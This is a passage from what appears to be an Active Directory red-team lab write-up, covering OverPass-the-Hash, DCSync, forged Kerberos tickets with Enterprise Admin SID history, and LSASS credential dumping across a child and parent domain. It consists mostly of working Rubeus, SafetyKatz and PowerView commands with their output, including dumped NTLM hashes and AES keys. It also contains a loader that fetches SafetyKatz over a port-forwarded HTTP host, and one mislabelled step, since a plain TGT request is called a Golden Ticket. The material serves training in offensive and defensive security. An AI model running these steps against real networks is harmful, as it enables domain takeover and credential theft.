Logon Time        : 3/11/2025 12:48:27 PM
SID               : S-1-5-18

         * Username : dbserver31$
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       a10de8a9e4b5640372d19d80b47f059aae33d80d89bb444e8b3057417b2af3e7🔑
           rc4_hmac_nt       8e49721313edefc3bd96634c5920130e
           rc4_hmac_old      8e49721313edefc3bd96634c5920130e
           rc4_md4           8e49721313edefc3bd96634c5920130e
           rc4_hmac_nt_exp   8e49721313edefc3bd96634c5920130e
           rc4_hmac_old_exp  8e49721313edefc3bd96634c5920130e

[SNIP]
```

---

### Domain Lateral Movement | OverPass-The-Hash + DCSync (with Rubeus)

14) **OverPass-The-Hash for Domain Privilege Escalation as `tech\sqlserversync`** (successful ✅)

Description: An OverPass-The-Hash approach was used to impersonate `tech\sqlserversync` by requesting a TGT with the account's AES-256 Kerberos key. Since `sqlserversync` possessed domain replication privileges, we then executed a DCSync attack on `tech\administrator` and `tech\krbtgt` to extract their AES-256 Kerberos keys and NTLM hashes. The successful retrieval of these credentials enables lateral movement and privilege escalation. Notably, the `tech\krbtgt` credentials are useful for Golden Ticket attacks, while the `tech\administrator` credentials provide administrative access to the domain, facilitating further exploitation.

![](./assets/badges/studvm-studentuser1.svg){.left}

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:sqlserversync /aes256:9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: tech.finance.corp
[*] Showing process : True
[*] Username        : T5GXXINY
[*] Domain          : SVDT1WDO
[*] Password        : WFSGH60A
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4176
[+] LUID            : 0xa5a8d0

[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: TECH.FINANCE.CORPsqlserversync
[*] Using aes256_cts_hmac_sha1 hash: 9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\sqlserversync'
[*] Target LUID : 10856656
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0xa5a8d0
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/TECH.FINANCE.CORP🏛️
  ServiceRealm             :  TECH.FINANCE.CORP
  UserName                 :  sqlserversync🎭 (NT_PRINCIPAL)
  UserRealm                :  TECH.FINANCE.CORP
  StartTime                :  3/11/2025 4:46:58 PM
  EndTime                  :  3/12/2025 2:46:58 AM
  RenewTill                :  3/18/2025 4:46:58 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  ytus0ORUsbaiJp5A0OsYlMIJtEEqYP2SnF3/dNGi+z0=
  ASREP (key)              :  9AD6E6B51E9E3C9512B3A924360F779886D7B08E6DA23D01AA4F664270B7EE65
```

![](./assets/badges/spawned_cmd.svg){.left}

![](./assets/badges/studvm-studentuser0.svg){.left}

`klist`:
```
Current LogonId is 0:0xa5a8d0

Cached Tickets: (1)

#0>     Client: sqlserversync🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 16:46:58 (local)
        End Time:   3/12/2025 2:46:58 (local)
        Renew Time: 3/18/2025 16:46:58 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp📌

[SNIP]

[DC] 'tech.finance.corp'🏛️ will be the domain
[DC] 'tech-dc🖥️.tech.finance.corp' will be the DC server
[DC] 'tech\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/11/2025 6:59:11 AM
Object Security ID   : S-1-5-21-1325336202-3661212667-302732393-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: c8c5d0537d1ef5ba43af84fd66dfb498🔑
    ntlm- 0: c8c5d0537d1ef5ba43af84fd66dfb498
    ntlm- 1: f875aad4174d8265844b09ef1ddb6e93
    ntlm- 2: 9e482ed416a6e98116bb264d704fc3a4
    ntlm- 3: 1c649b80c81e407469e39a4feb4ae173
    ntlm- 4: 36ce545b31de928a63d3cec844fdf8c6
    ntlm- 5: 8d205a3d324a50624a141d6aa8b81966
    ntlm- 6: d1ed73ddb4453a4d927b62af59f9b16e
    lm  - 0: b048280988a48668af05934c802b4cba
    lm  - 1: e88f96253c4c1fa0bf2699f9b9c7dca7
    lm  - 2: 381c1dabe1e518585fceeeb5bc7dc686
    lm  - 3: 0d11502c286392d1481bab098600eefb
    lm  - 4: d8b16223b8dce40b1eca3c1c32212e81
    lm  - 5: bb824155cea8e8aff8301e31ade7c0d1
    lm  - 6: 2f841df9adc53fcc71d8a0588bf13181

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 67640f8b9fb1f4e43cc4f4be9107dee2

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECH.FINANCE.CORPkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3a1a8536741cc8565ad4785e6dca779deb438c19d5e91bba596682de9fccf2d3🔑
      aes128_hmac       (4096) : 3956556c7fba9cf17339c2d21319689d
      des_cbc_md5       (4096) : 16df9d62f797232c
    OldCredentials
      aes256_hmac       (4096) : ec906e7b3979eee090adcd80feb6f990aff726fcaf49465cd4e326168c8c2941
      aes128_hmac       (4096) : 950f16f1f357dede948a1b382b11ca4a
      des_cbc_md5       (4096) : 0d493b10df4013a2
    OlderCredentials
      aes256_hmac       (4096) : 9ee3ed0c1e1cf514236e977e3f53b8d0a3f02f16636cd3385380dd1e9879ec4c
      aes128_hmac       (4096) : 1268aaaff3549e49e4c8c618037009ef
      des_cbc_md5       (4096) : 7a94dc8fc4bff1f4

[SNIP]
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp📌

[SNIP]

[DC] 'tech.finance.corp'🏛️ will be the domain
[DC] 'tech-dc🖥️.tech.finance.corp' will be the DC server
[DC] 'tech\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 3/16/2022 3:56:32 AM
Object Security ID   : S-1-5-21-1325336202-3661212667-302732393-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: acfd00282fbe922483c12e049e6e8990🔑
    ntlm- 0: acfd00282fbe922483c12e049e6e8990
    ntlm- 1: 58ce52a1d25fff985d061827fc475535
    ntlm- 2: acfd00282fbe922483c12e049e6e8990
    ntlm- 3: 38038c7899ece8fd5b2670061e52562a
    ntlm- 4: acfd00282fbe922483c12e049e6e8990
    lm  - 0: 57d8b5b97f50b007ce8b47e01ee07464
    lm  - 1: 2f60b78ccdcdfb823c9d5316ca933db0
    lm  - 2: 3a1f73c8e89a46dd4dd5479af7d21605
    lm  - 3: 4f1d3bd9e2e89852bd96a05d5aa97e9e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 894e9ba9f4c91c118b9bfe648cdad5be

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECH.FINANCE.CORPAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165🔑
      aes128_hmac       (4096) : 309331140cd7f06f9bdafb80a23a3a93
      des_cbc_md5       (4096) : 9bcb46852a514aef
    OldCredentials
      aes256_hmac       (4096) : a4956a2aa09644773e0a360b5c905a4d086ef68fd644005e35ab6089de1b5cc6
      aes128_hmac       (4096) : abf97894a1886f2087a18cd77f912345
      des_cbc_md5       (4096) : 0b9b89a4d9a40797
    OlderCredentials
      aes256_hmac       (4096) : d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165
      aes128_hmac       (4096) : 309331140cd7f06f9bdafb80a23a3a93
      des_cbc_md5       (4096) : 9bcb46852a514aef

[SNIP]
```

---

### Domain Persistence | Golden Ticket (with Rubeus)

15) **Golden Ticket Attack for Domain Persistence and Domain Lateral Movement to `tech-dc.tech.finance.corp`** (successful ✅)

Description: Leveraged the AES-256 Kerberos key extracted for `tech\administrator` to forge a Golden Ticket for the `krbtgt/tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting administrator-level access to the domain. This technique allows domain persistence, as the forged ticket can continue to provide access to the domain services, bypassing the standard authentication mechanism.

![](./assets/badges/studvm-studentuser1.svg){.left}

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: tech.finance.corp
[*] Showing process : True
[*] Username        : RY2UWDIO
[*] Domain          : QCUPTQMT
[*] Password        : KHJ0WPOJ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4172
[+] LUID            : 0xb54cdf

[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: TECH.FINANCE.CORPAdministrator
[*] Using aes256_cts_hmac_sha1 hash: d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\administrator'
[*] Target LUID : 11881695
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x143ec18
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/TECH.FINANCE.CORP
  ServiceRealm             :  TECH.FINANCE.CORP🏛️
  UserName                 :  Administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  TECH.FINANCE.CORP
  StartTime                :  3/11/2025 5:27:49 PM
  EndTime                  :  3/12/2025 3:27:49 AM
  RenewTill                :  3/18/2025 5:27:49 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  4a0nPVWsWRtXkvj8fVNiujrd3S57gbr5Q5urdQeYoD0=
  ASREP (key)              :  D9410BD213225049D5BEB8CD5FA2EEEFC856FFBAA6F35541AC91D6BA2C5ED165
```

![](./assets/badges/spawned_cmd.svg){.left}

![](./assets/badges/studvm-studentuser0.svg){.left}

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

`klist`:
```
Current LogonId is 0:0xb54cdf

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 17:27:49 (local)
        End Time:   3/12/2025 3:27:49 (local)
        Renew Time: 3/18/2025 17:27:49 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\tech-dc\C$\Users\Public\Loader.exe /Y`:
```
Does \\tech-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:tech-dc.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2510]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```
🚀

![](./assets/badges/techdc-administrator1.svg){.left}

`whoami`:
```
tech\administrator👤
```

`hostname`:
```
tech-dc🖥️
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TECH\Group Policy Creator Owners            Group            S-1-5-21-1325336202-3661212667-302732393-520 Mandatory group, Enabled by default, Enabled group
TECH\Domain Admins👥                        Group            S-1-5-21-1325336202-3661212667-302732393-512 Mandatory group, Enabled by default, Enabled group✅
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
TECH\Denied RODC Password Replication Group Alias            S-1-5-21-1325336202-3661212667-302732393-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288
```
🚩

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

16) **Credential Extraction on `tech-dc.tech.finance.corp`** (successful ✅)

Description: Extracted credentials include the NTLM hashes of high-privileged accounts such as `tech\administrator` and `tech\krbtgt` from LSASS memory on `tech-dc.tech.finance.corp`. These credentials can be used for domain lateral movement, escalating privileges, and maintaining domain persistence.

![](./assets/badges/techdc-administrator1.svg){.left}

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-lsa /patch📌

Domain : TECH🏛️ / S-1-5-21-1325336202-3661212667-302732393📌

RID  : 000001f4 (500)
User : Administrator👤
LM   :
NTLM : acfd00282fbe922483c12e049e6e8990🔑

[SNIP]

RID  : 000001f6 (502)
User : krbtgt👤
LM   :
NTLM : c8c5d0537d1ef5ba43af84fd66dfb498🔑

RID  : 00000454 (1108)
User : studentuser
LM   :
NTLM : 9acca9c6000308085f051a10fe1b5d50

RID  : 00000455 (1109)
User : techservice
LM   :
NTLM : ac25af07540962863d18c6f924ee8ff3

RID  : 00000456 (1110)
User : databaseagent
LM   :
NTLM : 73e728f67a9d8a07983f0b9ce7257fcc

RID  : 00000457 (1111)
User : sqlserversync
LM   :
NTLM : c4fa140adb18d91b7ad9e2bfbc15ab0a

RID  : 000003e8 (1000)
User : TECH-DC$👤
LM   :
NTLM : 0f4f0d4b485a082c384e731e64c700a8🔑

RID  : 00000450 (1104)
User : STUDVM$
LM   :
NTLM : e5c5fa4934a2a058fb61bf3a143d4050

RID  : 00000451 (1105)
User : MGMTSRV$
LM   :
NTLM : 207218a0920d00bbbd4daa22f6e767d3

RID  : 00000452 (1106)
User : TECHSRV30$
LM   :
NTLM : 54c0572a3ddc383be81cdd37b3c8d8a6

RID  : 00000453 (1107)
User : DBSERVER31$
LM   :
NTLM : 8e49721313edefc3bd96634c5920130e

RID  : 0000044f (1103)
User : FINANCE$
LM   :
NTLM : 862f4b5c687b92f464576a572b5214e6

[SNIP]
```

---

### Cross Trust Attacks | Child Domain `krbtgt` Kerberos Key Abuse (with PowerView, Rubeus, SafetyKatz)

17) **Child Domain `krbtgt` Kerberos Key Abuse and Domain Lateral Movement to `finance-dc.finance.corp`** (successful ✅)

Description: Abused the child domain `krbtgt` TGT encryption key from `tech.finance.corp` to forge a Golden Ticket that includes the Enterprise Admin SID in its SID History. Leveraging this forged ticket enabled cross-domain privilege escalation and domain lateral movement, ultimately granting administrative access on `finance-dc.finance.corp` and facilitating further exploitation within the root domain `finance.corp`.

- 17.1) **Forge a Golden Ticket (with EA SID History) using the Child DC's `krbtgt` TGT Encryption Key**

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainGroup "Enterprise Admins" -Domain finance.corp | Select-Object -ExpandProperty objectsid`:
```
S-1-5-21-1712611810-3596029332-2671080496-519📌
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:tech.finance.corp /sid:S-1-5-21-1325336202-3661212667-302732393 /sids:S-1-5-21-1712611810-3596029332-2671080496-519 /aes256:3a1a8536741cc8565ad4785e6dca779deb438c19d5e91bba596682de9fccf2d3 /netbios:tech /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : TECH.FINANCE.CORP🏛️ (tech)
[*] SID            : S-1-5-21-1325336202-3661212667-302732393📌
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-1712611810-3596029332-2671080496-519📌
[*] ServiceKey     : 3A1A8536741CC8565AD4785E6DCA779DEB438C19D5E91BBA596682DE9FCCF2D3
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 3A1A8536741CC8565AD4785E6DCA779DEB438C19D5E91BBA596682DE9FCCF2D3
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : tech.finance.corp

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@tech.finance.corp🏛️'

[*] AuthTime       : 3/11/2025 6:14:50 PM
[*] StartTime      : 3/11/2025 6:14:50 PM
[*] EndTime        : 3/12/2025 4:14:50 AM
[*] RenewTill      : 3/18/2025 6:14:50 PM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

- 17.2) **Leverage the Forged Ticket to Gain Enterprise Administrator Access and Remote Control to the Parent DC**

`klist`:
```
Current LogonId is 0:0x13e557

Cached Tickets: (2)

#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/11/2025 18:14:50 (local)
        End Time:   3/12/2025 4:14:50 (local)
        Renew Time: 3/18/2025 18:14:50 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/finance-dc🖥️.finance.corp @ FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/11/2025 18:12:27 (local)
        End Time:   3/12/2025 4:12:10 (local)
        Renew Time: 3/18/2025 18:12:10 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\finance-dc\C$\Users\Public\Loader.exe /Y`:
```
Does \\finance-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:finance-dc.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2510]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

![](./assets/badges/financedc-administrator1.svg){.left}

`set username`:
```
USERNAME=Administrator👑
```

`set computername`:
```
COMPUTERNAME=FINANCE-DC🖥️
```
🚩

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

18) **Credential Extraction on `finance-dc.finance.corp`** (successful ✅)

Description: Extracted the NTLM hashes of all the domain accounts from LSASS memory on `finance-dc.finance.corp`. These credentials can be leveraged for lateral movement and further privilege escalation within the root domain `finance.corp`.

![](./assets/badges/financedc-administrator1.svg){.left}

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-lsa /patch📌

Domain : FINANCE🏛️ / S-1-5-21-1712611810-3596029332-2671080496📌

RID  : 000001f4 (500)
User : Administrator👤
LM   :
NTLM : 58ce52a1d25fff985d061827fc475535🔑

[SNIP]

RID  : 000001f6 (502)
User : krbtgt👤
LM   :
NTLM : 449b7acf3ddeef577218e66df19510de🔑

RID  : 000003e8 (1000)
User : FINANCE-DC$👤
LM   :
NTLM : d3d27180dea3670873238d414ef9bcbf🔑

RID  : 0000044f (1103)
User : TECH$
LM   :
NTLM : 862f4b5c687b92f464576a572b5214e6

[SNIP]
```

---
---
